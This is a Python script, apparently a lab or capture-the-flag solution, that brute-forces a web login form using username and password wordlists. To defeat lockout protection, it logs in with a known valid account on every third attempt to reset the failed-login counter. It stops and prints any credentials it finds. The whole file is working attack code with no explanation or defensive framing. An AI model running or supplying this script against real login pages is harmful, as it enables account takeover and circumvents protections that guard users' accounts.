import requests
from sys import argv


### Print How to use this script if there are not enough entries
if not len(argv) == 6:
    print("|| Warning||")
    print('USAGE: FILENAME.py "VALID_USERNAME" "VALID_PASSWORD" "USERAME_LIST_PATH" "PASSWORD_LIST_PATH" "LOGIN_PAGE_URL"')
    exit()

valid_username = argv[1]
valid_password = argv[2]

valid_credential = {'username' : argv[1],
                    'password' : argv[2]}

if not argv[5].endswith("/login"):
    print("|| Warning||")
    print("Wrong login page url.")
    

### Set file's usernames in a list
if argv[3].endswith(".txt"):
    try:
        with open(argv[3],"r") as file:
            usernames = file.read().splitlines()
    except Exception as e:
        print(e)
else:
    raise Exception("Please choose text file")
    
### Set file's passwords in a list
if argv[4].endswith(".txt"):
    try:
        with open(argv[4],"r") as file:
            passwords = file.read().splitlines()
    except Exception as e:
        print(e)
else:
    raise Exception("Please choose text file")
    
    
### Requests users and passwords and after
i = 1

for password in passwords:
    for username in usernames:
        print(i)
        if (i%3 == 0):
            try:
                req = requests.post(argv[5], data = valid_credential, timeout = 15)
                print("RESET")
                i += 1
                break
            except Exception as e:
                print(e)
                exit()
        
        param = {'username':username,
                'password' : password}
        try:
            req = requests.post(argv[5], data = param, timeout = 15)
        except Exception as e:
            print(e)
            exit()
        
        if "Your username is:" in req.text:
            print("Username ==> " + username)
            print("Password ==> " + password)
            exit()
        
        i += 1